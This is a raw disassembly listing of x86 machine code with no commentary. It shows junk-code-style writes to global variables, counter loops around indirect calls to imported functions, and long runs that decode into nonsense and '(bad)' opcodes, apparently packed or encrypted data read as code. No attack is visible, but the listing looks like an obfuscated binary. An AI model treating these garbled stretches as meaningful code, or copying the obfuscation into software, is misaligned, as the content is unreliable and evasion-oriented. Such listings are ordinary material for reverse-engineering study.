  40625d:	sbb    DWORD PTR ds:0x4245c2,0x415105
  406267:	add    edx,ecx
  406269:	mov    DWORD PTR ds:0x41abda,0x19aa
  406273:	cmp    edi,edx
  406275:	mov    DWORD PTR ds:0x4150fd,0x443e
  40627f:	jb     0x4072d5
  406285:	mov    edx,DWORD PTR [ebp-0x28]
  406288:	sbb    edi,0x1e1d
  40628e:	mov    edi,DWORD PTR [ebp-0x4]
  406291:	mov    ebx,DWORD PTR ds:0x417e45
  406297:	or     DWORD PTR ds:0x417e3d,ebx
  40629d:	xor    edx,eax
  40629f:	xor    edi,eax
  4062a1:	mov    DWORD PTR ds:0x417e55,0x5fc7
  4062ab:	add    edi,ecx
  4062ad:	dec    ebx
  4062ae:	add    edx,ecx
  4062b0:	dec    ebx
  4062b1:	imul   edx,edi
  4062b4:	sbb    DWORD PTR ds:0x41abe2,0x63fb
  4062be:	mov    edi,DWORD PTR [ebp-0x8]
  4062c1:	mov    DWORD PTR ds:0x41abd2,0x13
  4062cb:	cmp    DWORD PTR ds:0x41abd2,0x0
  4062d2:	je     0x406309
  4062d8:	cmp    DWORD PTR ds:0x41abd2,0x23
  4062df:	jne    0x4062f1
  4062e5:	push   DWORD PTR [ebp-0x18]
  4062e8:	push   DWORD PTR [ebp-0x24]
  4062eb:	call   DWORD PTR ds:0x40d364
  4062f1:	mov    ebx,DWORD PTR ds:0x41abd2
  4062f7:	dec    ebx
  4062f8:	mov    DWORD PTR ds:0x41abd2,ebx
  4062fe:	jmp    0x4062cb
  406303:	sbb    ebx,0x2ce7
  406309:	mov    ebx,DWORD PTR [ebp-0x10]
  40630c:	inc    DWORD PTR ds:0x41abce
  406312:	sub    ebx,edi
  406314:	mov    DWORD PTR ds:0x4245c6,0x7511
  40631e:	cmp    ebx,edx
  406320:	mov    DWORD PTR ds:0x41abd2,0x3d79
  40632a:	ja     0x40635a
  406330:	mov    edx,DWORD PTR [ebp-0x4]
  406333:	mov    DWORD PTR ds:0x412368,0x316e
  40633d:	xor    edx,eax
  40633f:	add    DWORD PTR ds:0x415109,0x4882
  406349:	add    edx,ecx
  40634b:	mov    DWORD PTR ds:0x417e59,0x234c
  406355:	jmp    0x40672b
  40635a:	mov    edx,DWORD PTR [ebp-0x2c]
  40635d:	sbb    DWORD PTR ds:0x412370,0x4f34
  406367:	mov    edi,DWORD PTR [ebp-0x4]
  40636a:	and    ebx,0x5352
  406370:	xor    edx,eax
  406372:	and    DWORD PTR ds:0x415111,0x0
  40637c:	jmp    0x40638e
  406381:	mov    ebx,DWORD PTR ds:0x415111
  406387:	inc    ebx
  406388:	mov    DWORD PTR ds:0x415111,ebx
  40638e:	cmp    DWORD PTR ds:0x415111,0x16
  406395:	jae    0x406508
  40639b:	cmp    DWORD PTR ds:0x415111,0x1c
  4063a2:	jne    0x4063b1
  4063a8:	push   DWORD PTR [ebp-0x1c]
  4063ab:	call   DWORD PTR ds:0x40d1d4
  4063b1:	jmp    0x406381
  4063b6:	jmp    0x406508
  4063bb:	add    eax,DWORD PTR [esi]
  4063bd:	mov    al,ds:0xf969b94b
  4063c2:	inc    esi
  4063c3:	popf   
  4063c4:	imul   ebp,DWORD PTR [ebx-0xa04dfe8],0xffffffb4
  4063cb:	jmp    0x7e7f:0x237e7e0c
  4063d2:	jle    0x406354
  4063d4:	sbb    al,0x7b
  4063d6:	mov    ecx,0x72dc26d3
  4063db:	std    
  4063dc:	outs   dx,DWORD PTR ds:[esi]
  4063dd:	cmc    
  4063de:	fidiv  WORD PTR [eax+edi*4]
  4063e1:	adc    ah,BYTE PTR [edi+0x1ccb40be]
  4063e7:	mov    eax,0x86d4d69d
  4063ec:	fsubr  DWORD PTR [edi-0x76]
  4063ef:	mul    BYTE PTR ds:0x943ff1d8
  4063f5:	sbb    BYTE PTR [edi],0xfc
  4063f8:	add    eax,0xd031d1b
  4063fd:	je     0x406451
  4063ff:	xlat   BYTE PTR ds:[ebx]
  406400:	pop    edi
  406401:	das    
  406402:	add    DWORD PTR [ebp-0x5e64c683],ecx
  406408:	adc    DWORD PTR [eax],esi
  40640a:	dec    esp
  40640b:	es push ss
  40640d:	add    dl,bh
  40640f:	daa    
  406410:	les    esp,FWORD PTR [bp-0x47]
  406414:	inc    ecx
  406415:	adc    DWORD PTR [esi-0x4c],edx
  406418:	ror    BYTE PTR [edi-0x48],0x14
  40641c:	sub    DWORD PTR [edi+ecx*8+0x72],ecx
  406420:	stos   DWORD PTR es:[edi],eax
  406421:	xor    eax,0x871664ee
  406426:	sub    BYTE PTR [edx],0x9e
  406429:	int3   
  40642a:	jle    0x406433
  40642c:	dec    eax
  40642d:	stc    
  40642e:	adc    DWORD PTR [eax+0x37],edi
  406431:	arpl   WORD PTR [esi*8-0x503b2669],dx
  406438:	cmp    eax,0xb8f5e794
  40643d:	xor    DWORD PTR [ebx+ebx*4],edi
  406440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406441:	sub    DWORD PTR [ebp+ebp*1+0x40],ecx
  406445:	xor    bh,dh
  406447:	repnz cmp DWORD PTR [ebx-0x26],0xcf018f27
  40644f:	xchg   esp,eax
  406450:	mov    bh,0x38
  406452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406453:	mov    ebp,DWORD PTR [esp+eiz*8+0x54]
  406457:	xchg   ebx,eax
  406458:	mov    dl,0x9
  40645a:	fnstenv [ecx]
  40645c:	mov    ebp,0xb59d67af
  406461:	sub    eax,0x127c3f27
  406466:	fimul  WORD PTR [ebx+0x42]
  406469:	dec    ebp
  40646a:	scas   al,BYTE PTR es:[edi]
  40646b:	lods   eax,DWORD PTR ds:[esi]
  40646c:	jp     0x406477
  40646e:	mov    ebp,0x74300027
  406473:	outs   dx,BYTE PTR ds:[esi]
  406474:	out    dx,al
  406475:	jge    0x406477
  406477:	xlat   BYTE PTR ds:[ebx]
  406478:	gs mov dl,0x5a
  40647b:	push   ss
  40647c:	leave  
  40647d:	mov    DWORD PTR [ebp+0x7a33f201],esp
  406483:	in     al,dx
  406484:	mov    ?,esi
  406486:	shl    DWORD PTR [eax+0x17ed60b7],1
  40648c:	dec    edi
  40648d:	inc    ecx
  40648e:	shl    DWORD PTR es:[ebx+0x44],cl
  406492:	(bad)  
  406493:	out    0x38,al
  406495:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406496:	test   ah,0xb7
  406499:	out    dx,al
  40649a:	jnp    0x4064ca
  40649c:	xor    bh,BYTE PTR [ebx]
  40649e:	sbb    DWORD PTR [edx-0x6216fb15],ebx
  4064a4:	xchg   ebp,eax
  4064a5:	int3   
  4064a6:	shl    esi,0x12
  4064a9:	xchg   ecx,eax
  4064aa:	inc    edi
  4064ab:	dec    edx
  4064ac:	mov    ecx,DWORD PTR [ebp+0x32]
  4064af:	or     eax,0x9a7a5619
  4064b4:	push   ebx
  4064b5:	mov    ds:0x22f2f9dc,al
  4064ba:	xchg   ebx,eax
  4064bb:	retf   0x4bd3
  4064be:	xchg   esi,eax
  4064bf:	(bad)  
  4064c0:	adc    bl,dl
  4064c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064c3:	jb     0x4064d6
  4064c5:	add    ch,BYTE PTR [esi]
  4064c7:	mov    ?,WORD PTR [ebp-0x1b5563da]
  4064cd:	mov    ecx,0x43055724
  4064d3:	inc    esi
  4064d4:	sbb    BYTE PTR [edx],cl
  4064d6:	sbb    dh,BYTE PTR [eax-0x104433cf]
  4064dc:	xchg   ebx,eax
  4064dd:	mov    al,0xed
  4064df:	imul   ebp,DWORD PTR [edi+esi*1],0xbe142eb3
  4064e6:	dec    esi
  4064e7:	sbb    al,0x88
  4064e9:	das    
  4064ea:	ja     0x4064f9
  4064ec:	jmp    0x406484
  4064ee:	mov    ch,0xf0
  4064f0:	mov    dl,0x3c
  4064f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064f3:	les    edx,FWORD PTR [ebx+ebp*8+0x3f8addd1]
  4064fa:	adc    DWORD PTR [ecx],0x3a
  4064fd:	test   BYTE PTR [edx],ch
  4064ff:	imul   esp
  406501:	int    0x4c
  406503:	ds inc esp
  406505:	ins    BYTE PTR es:[edi],dx
  406506:	fnstenv ss:[ebx]
  406509:	clc    
  40650a:	add    edi,ecx
  40650c:	add    edx,ecx
  40650e:	imul   edx,edi
  406511:	mov    edi,DWORD PTR [ebp-0x8]
  406514:	jmp    0x406666
  406519:	jbe    0x406527
  40651b:	xchg   ebp,eax
  40651c:	call   0xe08bdec6
  406521:	adc    DWORD PTR ds:0x7e4e4057,edi
  406527:	imul   ebx,ecx,0xffffff9f
  40652a:	or     eax,0x7f237e7e
  40652f:	jle    0x4065af
  406531:	xchg   ecx,eax
  406532:	mov    WORD PTR [eax],es
  406534:	or     DWORD PTR [ebx],0x7ec3fa30
  40653a:	popf   
  40653b:	lods   al,BYTE PTR ds:[esi]
  40653c:	cmp    ecx,DWORD PTR [ecx-0x6e]
  40653f:	out    dx,eax
  406540:	cli    
  406541:	sar    BYTE PTR [ecx],1
  406543:	cmp    edx,ecx
  406545:	mul    DWORD PTR [eax-0x16ba4123]
  40654b:	cli    
  40654c:	in     al,dx
  40654d:	xor    eax,DWORD PTR ds:0x820d35ec
  406553:	xchg   DWORD PTR [ecx],edx
  406555:	fwait
  406556:	outs   dx,BYTE PTR es:[esi]
  406558:	dec    edx
  406559:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40655a:	mov    BYTE PTR [eax+0x2b02ac58],cl
  406560:	pushf  
  406561:	sar    ebx,0xe1
  406564:	xchg   ecx,eax
  406565:	sbb    ecx,DWORD PTR [eax+ebp*2]
  406568:	mov    esi,0x65e0262f
  40656d:	pop    edi
  40656e:	or     bh,BYTE PTR [ebx-0x28]
  406571:	push   eax
  406572:	fidiv  DWORD PTR ds:0x7ccb3ddc
  406578:	jge    0x4065a5
  40657a:	adc    BYTE PTR [ecx-0x5b8c1b98],0x9c
  406581:	cmp    ecx,DWORD PTR [ebp+0x1f]
  406584:	add    ch,BYTE PTR [esp+eax*1-0x8628538]
  40658b:	dec    edi
  40658c:	xor    esi,eax
  40658e:	adc    al,0x60
  406590:	xchg   DWORD PTR [ebx+0x2eb6f251],ecx
  406596:	cmp    ebp,DWORD PTR [esi+0x38c520fb]
  40659c:	push   0x30
  40659e:	xor    DWORD PTR [ecx],ecx
  4065a0:	mov    ecx,0x8f111333
  4065a5:	add    dh,BYTE PTR [ebx+0x47263da9]
  4065ab:	and    edx,DWORD PTR [edi]
  4065ad:	and    al,cl
  4065af:	(bad)  
  4065b0:	lea    esi,[eax]
  4065b2:	(bad)  
  4065b4:	push   edx
  4065b5:	(bad)  
  4065b6:	mov    esp,0x1f58b9bd
  4065bb:	enter  0x6ba2,0xaf
  4065bf:	mov    cs,WORD PTR [ecx+0x184f1b60]
  4065c5:	rol    cl,0x81
  4065c8:	data16 dec ch
  4065cb:	inc    BYTE PTR [edi+0x4c]
  4065ce:	inc    esp
  4065cf:	push   edi
  4065d0:	add    eax,0x42e59dd2
  4065d5:	ins    DWORD PTR es:[edi],dx
  4065d6:	mov    DWORD PTR [edx-0x5882ec71],ebp
  4065dc:	rcr    BYTE PTR [ebx+eiz*8-0x19],cl
  4065e0:	mov    gs,WORD PTR [ebx+0x3f]
  4065e3:	xor    esi,DWORD PTR [esi-0x6d4075e4]
  4065e9:	mov    bh,0xcb
  4065eb:	mov    BYTE PTR [ebx+0x1dcea491],0xcd
  4065f2:	push   ss
  4065f3:	push   ecx
  4065f4:	or     BYTE PTR [esi-0x64],cl
  4065f7:	dec    ebx
  4065f8:	test   BYTE PTR [eax+0x63],cl
  4065fb:	(bad)  
  4065fc:	sub    dl,BYTE PTR [esi+0x2c]
  4065ff:	mov    dh,0x95
  406601:	dec    esi
  406602:	cli    
  406603:	fcomp  QWORD PTR [ebx-0x358ff334]
  406609:	add    ecx,ebp
  40660b:	push   cs
  40660c:	xor    al,0x44
  40660e:	into   
  40660f:	xchg   edi,eax
  406610:	fild   QWORD PTR [esi+0x1987c54f]
  406616:	jnp    0x406654
  406618:	jmp    0xec3:0xf8407baa
  40661f:	sub    edx,DWORD PTR [edi+0x2d]
  406622:	test   BYTE PTR [eax+0x149e480d],dl
  406628:	xchg   edi,eax
  406629:	xor    eax,0xf2c43de7
  40662e:	test   eax,0x4d7f09da
  406633:	jp     0x406605
  406635:	add    eax,0x9daf550e
  40663a:	pop    edi
  40663b:	(bad)  
  40663c:	int3   
  40663d:	les    eax,FWORD PTR [esi+ecx*8]
  406640:	push   edx
  406641:	bound  ebx,QWORD PTR [esi+0x2a4980d0]
  406647:	(bad)  
  406648:	sub    DWORD PTR [eax+eax*2-0x2a],edx
  40664c:	leave  
  40664d:	mov    ebp,ebp
  40664f:	bound  edi,QWORD PTR [ebx+0x5e]
  406652:	inc    edi
  406653:	mov    ds:0x66a891f8,al
  406658:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406659:	push   esp
  40665a:	cdq    
  40665b:	sub    DWORD PTR [eax],0xffffff8a
  40665e:	or     dl,BYTE PTR [eax-0x73]
  406661:	mov    edi,0x9bb50676
  406666:	mov    ebx,DWORD PTR [ebp-0x10]
  406669:	sub    ebx,edi
  40666b:	cmp    ebx,edx
  40666d:	ja     0x40667b
  406673:	mov    edx,DWORD PTR [ebp-0x28]
  406676:	jmp    0x40671d
  40667b:	mov    edx,DWORD PTR [ebp-0x30]
  40667e:	mov    edi,DWORD PTR [ebp-0x4]
  406681:	xor    edx,eax
  406683:	xor    edi,eax
  406685:	add    edi,ecx
  406687:	add    edx,ecx
  406689:	imul   edx,edi
  40668c:	mov    edi,DWORD PTR [ebp-0x8]
  40668f:	mov    ebx,DWORD PTR [ebp-0x10]
  406692:	sub    ebx,edi
  406694:	cmp    ebx,edx
  406696:	ja     0x4066a4
  40669c:	mov    edx,DWORD PTR [ebp-0x2c]
  40669f:	jmp    0x40671d
  4066a4:	mov    edx,DWORD PTR [ebp-0x34]
  4066a7:	mov    edi,DWORD PTR [ebp-0x4]
  4066aa:	xor    edx,eax
  4066ac:	xor    edi,eax
  4066ae:	add    edi,ecx
  4066b0:	add    edx,ecx
  4066b2:	imul   edx,edi
  4066b5:	mov    edi,DWORD PTR [ebp-0x8]
  4066b8:	mov    ebx,DWORD PTR [ebp-0x10]
  4066bb:	sub    ebx,edi
  4066bd:	cmp    ebx,edx
  4066bf:	ja     0x4066cd
  4066c5:	mov    edx,DWORD PTR [ebp-0x30]
  4066c8:	jmp    0x40671d
  4066cd:	mov    edx,DWORD PTR [ebp-0x38]
  4066d0:	mov    edi,DWORD PTR [ebp-0x4]
  4066d3:	xor    edx,eax
  4066d5:	xor    edi,eax
  4066d7:	add    edi,ecx
  4066d9:	add    edx,ecx
  4066db:	imul   edx,edi
  4066de:	mov    edi,DWORD PTR [ebp-0x8]
  4066e1:	mov    ebx,DWORD PTR [ebp-0x10]
  4066e4:	sub    ebx,edi
  4066e6:	cmp    ebx,edx
  4066e8:	ja     0x4066f6
  4066ee:	mov    edx,DWORD PTR [ebp-0x34]
  4066f1:	jmp    0x40671d
  4066f6:	mov    edx,DWORD PTR [ebp-0x3c]
  4066f9:	mov    edi,DWORD PTR [ebp-0x4]
  4066fc:	xor    edx,eax
  4066fe:	xor    edi,eax
  406700:	add    edx,ecx
  406702:	add    edi,ecx
  406704:	imul   edx,edi
  406707:	mov    edi,DWORD PTR [ebp-0x8]
  40670a:	mov    ebx,DWORD PTR [ebp-0x10]
  40670d:	sub    ebx,edi
  40670f:	cmp    ebx,edx
  406711:	mov    edx,DWORD PTR [ebp-0x38]
  406714:	jbe    0x40671d
  40671a:	mov    edx,DWORD PTR [ebp-0x3c]
  40671d:	mov    edi,DWORD PTR [ebp-0x4]
  406720:	xor    edi,eax
  406722:	xor    edx,eax
  406724:	add    edi,ecx
  406726:	add    edx,ecx
  406728:	imul   edx,edi
  40672b:	mov    DWORD PTR [ebp+0xc],edx
  40672e:	mov    edx,DWORD PTR [ebp+0xc]
  406731:	mov    DWORD PTR [ebp-0x24],edx
  406734:	mov    edx,DWORD PTR [ebp-0x8]
  406737:	jmp    0x406889
  40673c:	lock cs xchg ebx,eax
  40673f:	xchg   esi,eax
  406740:	mov    eax,ds:0xd53889bb
  406745:	and    esp,DWORD PTR [ebp+0x1b]
  406748:	je     0x4067bb
  40674a:	outs   dx,BYTE PTR ds:[esi]
  40674b:	aad    0x40
  40674d:	add    bh,BYTE PTR [esi+0x7e]
  406750:	and    edi,DWORD PTR [edi+0x7e]
  406753:	jle    0x40678b
  406755:	cmp    bl,BYTE PTR [ecx-0x50]
  406758:	rcr    cl,1
  40675a:	xchg   DWORD PTR [esi],ecx
  40675c:	add    al,0x2
  40675e:	inc    esi
  40675f:	data16 fild QWORD PTR [edi]
  406762:	pusha  
  406763:	sub    eax,eax
  406765:	xchg   ebp,eax
  406766:	dec    si
  406768:	daa    
  406769:	add    BYTE PTR [esp+eax*4],dl
  40676c:	ror    al,1
  40676e:	rcr    DWORD PTR [edx+esi*1-0x1d],1
  406772:	cwde   
  406773:	xchg   edi,eax
  406774:	sub    ebp,DWORD PTR [ecx]
  406776:	jmp    0x7ed5d4e5
  40677b:	cs enter 0x845c,0x28
  406780:	and    al,0xd7
  406782:	inc    edi
  406783:	add    DWORD PTR [ebp-0x27],esi
  406786:	dec    esp
  406787:	mov    ah,0x80
  406789:	ja     0x406731
  40678b:	sub    DWORD PTR [ecx+eax*4-0x68b51479],esp
  406792:	sahf   
  406793:	jo     0x406718
  406795:	xlat   BYTE PTR ds:[ebx]
  406796:	push   ebp
  406797:	xchg   esp,eax
  406798:	aas    
  406799:	dec    edi
  40679a:	mul    BYTE PTR [ebp+0xc7ac83]
  4067a0:	xor    ebp,DWORD PTR [ebp+0x7bf92f29]
  4067a6:	jge    0x4067a3
  4067a8:	out    dx,eax
  4067a9:	(bad)  
  4067aa:	jbe    0x40674f
  4067ac:	ds stos DWORD PTR es:[edi],eax
  4067ae:	jns    0x406776
  4067b0:	fnsave [esp+ecx*2+0x63237259]
  4067b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067b8:	jns    0x406817
  4067ba:	enter  0x51c3,0x3a
  4067be:	fwait
  4067bf:	pop    ecx
  4067c0:	mov    ecx,0xbdee23e5
  4067c5:	cmp    al,0x75
  4067c7:	out    dx,eax
  4067c8:	jne    0x406786
  4067ca:	mov    ah,ah
  4067cc:	(bad)
  4067cf:	mov    ecx,DWORD PTR [ebx+eiz*1]
  4067d2:	push   ecx
  4067d3:	add    dh,ch
  4067d5:	adc    DWORD PTR [ebx-0x2f3d831f],eax
  4067db:	sub    al,0x2d
  4067dd:	add    esi,DWORD PTR [eax]
  4067df:	loopne 0x40679a
  4067e1:	aam    0xc2
  4067e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067e4:	pop    esi
  4067e5:	retf   
  4067e6:	outs   dx,DWORD PTR ds:[esi]
  4067e7:	jno    0x406784
  4067e9:	call   0x5d5a84e2
  4067ee:	int3   
  4067ef:	ds or  al,0x58
  4067f2:	jmp    0x406798
  4067f4:	or     DWORD PTR ds:0xb0f9fc05,esi
  4067fa:	mov    al,0x94
  4067fc:	dec    ecx
  4067fd:	jno    0x406792
  4067ff:	hlt    
  406800:	pop    ss
  406801:	jbe    0x4067ee
  406803:	retf   0x88a1
  406806:	push   0xffffffcb
  406808:	test   al,0xd0
  40680a:	das    
  40680b:	xlat   BYTE PTR ds:[ebx]
  40680c:	mov    BYTE PTR ds:0x47fa4472,al
  406812:	add    esp,DWORD PTR [esp+ebx*8-0x15]
  406816:	xchg   ebx,eax
  406817:	add    DWORD PTR [edi-0x4bb530f],eax
  40681d:	inc    edi
  40681e:	(bad)  
  40681f:	popa   
  406820:	jl     0x4067a7
  406822:	stos   DWORD PTR es:[edi],eax
  406823:	fmul   DWORD PTR [ebx+0x1541ff20]
  406829:	lods   al,BYTE PTR ds:[esi]
  40682a:	(bad)  
  40682b:	mov    esp,eax
  40682d:	out    dx,al
  40682e:	sub    eax,esi
  406830:	inc    ecx
  406831:	shl    BYTE PTR [ecx+0x294fd207],1
  406837:	ret    
  406838:	ficomp WORD PTR [ebp-0x28]
  40683b:	in     eax,0xe5
  40683d:	dec    eax
  40683e:	loop   0x4067f8
  406840:	inc    eax
  406841:	les    esi,FWORD PTR [edi+0x74caaa1f]
  406847:	mov    ah,0x19
  406849:	or     eax,0xa7cc0335
  40684e:	sbb    DWORD PTR cs:[edi+0x7bd03b62],edx
  406855:	rcr    BYTE PTR [edx],0xb3
  406858:	cld    
  406859:	fs jp  0x406848
  40685c:	retf   0x659a
  40685f:	and    al,0x87
  406861:	push   ebp
  406862:	scas   eax,DWORD PTR es:[edi]
  406863:	aad    0x37
  406865:	jecxz  0x4068bf
  406867:	das    
  406868:	xor    edx,DWORD PTR [ebx+0x43]
  40686b:	int3   
  40686c:	nop
  40686d:	xchg   DWORD PTR [ebp-0x2c],esp
  406870:	in     al,0xb7
  406872:	repnz sbb dh,BYTE PTR [edx+eiz*1]
  406876:	nop
  406877:	mov    ebx,0x8311923b
  40687c:	aas    
  40687d:	repnz mov ah,0x56
  406880:	add    DWORD PTR [esi+0x16],0xeee5c1ff
  406887:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406888:	add    DWORD PTR [ebx],eax
  40688a:	push   ebp
  40688b:	rol    bh,0x45
  40688e:	call   0xf8dcedcb
  406893:	mov    DWORD PTR [ebp-0x1c],edx
  406896:	mov    DWORD PTR [ebp-0xc],0xf89c853b
  40689d:	mov    DWORD PTR [ebp-0x44],0xf89c853a
  4068a4:	mov    edx,DWORD PTR [ebp-0x18]
  4068a7:	jmp    0x4069f9
  4068ac:	daa    
  4068ad:	mov    ecx,0x7980c50e
  4068b2:	in     eax,0x79
  4068b4:	dec    ebp
  4068b5:	push   esp
  4068b6:	push   ecx
  4068b7:	cmp    al,0x7b
  4068b9:	jmp    0xb61b6a
  4068be:	jle    0x40693e
  4068c0:	and    edi,DWORD PTR [edi+0x7e]
  4068c3:	jle    0x406889
  4068c5:	fidiv  WORD PTR ds:0x6f3886bb
  4068cb:	dec    esp
  4068cc:	in     al,dx
  4068cd:	cmp    eax,0x6d2bea5f
  4068d2:	xor    DWORD PTR [edx],esp
  4068d4:	mov    al,ds:0xe63eb9a1
  4068d9:	fsubr  DWORD PTR [edi]
  4068db:	int    0x24
  4068dd:	out    0x62,al
  4068df:	call   0x22bf:0x6c140131
  4068e6:	popa   
  4068e7:	test   eax,0x77007465
  4068ec:	dec    ecx
  4068ed:	xchg   edi,eax
  4068ee:	daa    
  4068ef:	(bad)  
  4068f1:	aad    0x40
  4068f3:	xor    cl,BYTE PTR [ebp-0xc]
  4068f6:	jle    0x406967
  4068f8:	icebp  
  4068f9:	repz das 
  4068fb:	ret    0xf1ae
  4068fe:	pusha  
  4068ff:	leave  
  406900:	cli    
  406901:	mov    BYTE PTR gs:[ebx],ah
  406904:	pop    ebx
  406905:	mov    edi,esi
  406907:	enter  0xa0e6,0x8e
  40690b:	jp     0x406942
  40690d:	pusha  
  40690e:	xchg   BYTE PTR [edi],dh
  406910:	add    al,BYTE PTR [esp+edx*4-0x28]
  406914:	(bad)  [esi-0x2e285e55]
  40691a:	and    eax,0x2dc00941
  40691f:	call   0xc125:0x5f35c2c5
  406926:	cmp    DWORD PTR [ecx],edx
  406928:	shl    BYTE PTR [edi+0x58e508ec],0xec
  40692f:	mov    ds:0x35aee141,eax
  406934:	jecxz  0x40692c
  406936:	xor    DWORD PTR ds:0xa9b69d03,esp
  40693c:	fwait
  40693d:	mov    esi,0x8d7f5e94
  406942:	sub    DWORD PTR [edi],eax
  406944:	push   0x35cfb84c
  406949:	leave  
  40694a:	das    
  40694b:	or     DWORD PTR [ecx-0x3a],esi
  40694e:	rol    BYTE PTR ds:0x6fa59929,1
  406954:	jns    0x40699c
  406956:	mov    edi,0xc94bccb7
  40695b:	push   ss
  40695c:	xor    ah,BYTE PTR [eax]
  40695e:	mov    ebx,0x6cf0d473
  406963:	retf   0xc0c4
  406966:	out    dx,eax
  406967:	xor    DWORD PTR [edx],0xffffffcf
  40696a:	sub    edx,DWORD PTR [eax]
  40696c:	aad    0x88
  40696e:	scas   eax,DWORD PTR es:[edi]
  40696f:	adc    BYTE PTR [edi-0x31],bl
  406972:	or     BYTE PTR [edi],bh
  406974:	or     DWORD PTR [edi+0x6a],0xffffff9d
  406978:	inc    ebx
  406979:	(bad)  
  40697a:	fcom   st(3)
  40697c:	dec    esi
  40697d:	retf   0xd035
  406980:	fs pop ss
  406982:	(bad)  [edx+edi*2]
  406985:	ds dec edi
  406987:	sbb    eax,0x214bf548
  40698c:	pushf  
  40698d:	jg     0x4069de
  40698f:	adc    al,0xbe
  406991:	cmp    eax,0x10b44237
  406996:	inc    edx
  406997:	cli    
  406998:	stos   BYTE PTR es:[edi],al
  406999:	mov    edi,0xe89f6a06
  40699e:	sbb    eax,esp
  4069a0:	fdivr  QWORD PTR [eax-0x3b7e4305]
  4069a6:	call   0xd4eae8bd
  4069ab:	jp     0x40695e
  4069ad:	rol    ebx,0x66
  4069b0:	inc    ebp
  4069b1:	or     al,0x48
  4069b3:	add    eax,0xb82019bd
  4069b8:	jp     0x4069ef
  4069ba:	cmp    eax,0x45ab0052
  4069bf:	retf   0xb4f8
  4069c2:	into   
  4069c3:	add    ebx,DWORD PTR [edx+0x3a]
  4069c6:	pop    eax
  4069c7:	fucomip st,st(0)
  4069c9:	pop    es
  4069ca:	int    0x46
  4069cc:	icebp  
  4069cd:	jbe    0x4069df
  4069cf:	bnd jno 0x4069d7
  4069d2:	add    eax,0x91cf18ae
  4069d7:	jmp    0x8777:0xc0e54d6
  4069de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4069df:	cmp    al,0x8e
  4069e1:	loope  0x4069d9
  4069e3:	scas   eax,DWORD PTR es:[edi]
  4069e4:	test   al,0xa6
  4069e6:	push   ds
  4069e7:	xor    BYTE PTR [edi-0x3],dl
  4069ea:	les    ecx,FWORD PTR ds:0x3fa5884c
  4069f0:	dec    ecx
  4069f1:	popa   
  4069f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069f3:	sbb    al,BYTE PTR [edi]
  4069f5:	xor    ecx,DWORD PTR [edx-0x5f]
  4069f8:	gs xor edx,eax
  4069fb:	jmp    0x406b4d
  406a00:	int    0xfb
  406a02:	mov    ebx,0x65b3b933
  406a07:	stc    
  406a08:	repnz add eax,0x31667a93
  406a0e:	pop    eax
  406a0f:	cld    
  406a10:	add    DWORD PTR ds:[esi+0x7e],edi
  406a14:	and    edi,DWORD PTR [edi+0x7e]
  406a17:	jle    0x4069a4
  406a19:	inc    esp
  406a1a:	fld    TBYTE PTR [eax-0x1ab49b54]
  406a20:	aad    0xa4
  406a22:	daa    
  406a23:	clc    
  406a24:	ror    eax,cl
  406a26:	xor    eax,DWORD PTR [edi]
  406a28:	clc    
  406a29:	test   bh,ch
  406a2b:	bound  ebx,QWORD PTR [edx+0x4a]
  406a2e:	dec    edi
  406a2f:	mov    dh,BYTE PTR [edi-0x31]
  406a32:	push   cs
  406a33:	add    DWORD PTR [eax-0x2635ed21],ecx
  406a39:	cmp    eax,0x8e65017a
  406a3e:	sub    BYTE PTR [edx],ch
  406a40:	xor    DWORD PTR [ebx-0xe],ebp
  406a43:	ret    0x6ee
  406a46:	repz pop ds
  406a48:	jbe    0x406a1b
  406a4a:	out    dx,eax
  406a4b:	loope  0x4069e8
  406a4d:	outs   dx,DWORD PTR ds:[esi]
  406a4e:	outs   dx,DWORD PTR ds:[esi]
  406a4f:	mov    bl,0x74
  406a51:	rcl    BYTE PTR [edx+ebp*4],1
  406a54:	mov    cs,ebx
  406a56:	xchg   edx,eax
  406a57:	mov    ebp,DWORD PTR [ecx-0x57]
  406a5a:	jae    0x406a62
  406a5c:	sub    bh,BYTE PTR ds:0x39efd0ac
  406a62:	cdq    
  406a63:	sub    ecx,DWORD PTR [ecx]
  406a65:	mov    dl,0x74
  406a67:	call   0xd2276237
  406a6c:	(bad)  
  406a6d:	mov    BYTE PTR [edi],bh
  406a6f:	jbe    0x406a13
  406a71:	pop    esi
  406a72:	mov    bh,0xb
  406a74:	out    0x50,al
  406a76:	cdq    
  406a77:	loope  0x406a2a
  406a79:	mov    ds:0x56d9ba9b,eax
  406a7e:	cs aam 0x8a
  406a81:	push   0xac0282f8
  406a86:	rcl    DWORD PTR [eax],0x52
  406a89:	cmp    BYTE PTR [edi],cl
  406a8b:	mov    esp,0xbf31e8e7
  406a90:	shr    DWORD PTR [edi+0x24],0x79
  406a94:	and    BYTE PTR [eax-0x4e7ca843],ch
  406a9a:	and    DWORD PTR [ebx-0x1b712d0b],edi
  406aa0:	repnz pop edi
  406aa2:	jle    0x406ab6
  406aa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406aa5:	mov    ds:0x2a368fbd,eax
  406aaa:	or     BYTE PTR [esp+eax*4],cl
  406aad:	test   DWORD PTR [edx+0x7800dcac],eax
  406ab3:	das    
  406ab4:	lods   eax,DWORD PTR ds:[esi]
  406ab5:	xor    edx,DWORD PTR [esi]
  406ab7:	and    BYTE PTR [edx-0x3a],0xb5
  406abb:	out    dx,eax
  406abc:	add    edx,DWORD PTR [ebx]
  406abe:	mov    dh,0xd6
  406ac0:	pop    edx
  406ac1:	(bad)  
  406ac3:	std    
  406ac4:	pop    ss
  406ac5:	xor    DWORD PTR [ebx],eax
  406ac7:	pushf  
  406ac8:	jmp    0x3ce5f9e2
  406acd:	stos   BYTE PTR es:[edi],al
  406ace:	xchg   esp,eax
  406acf:	pop    ds
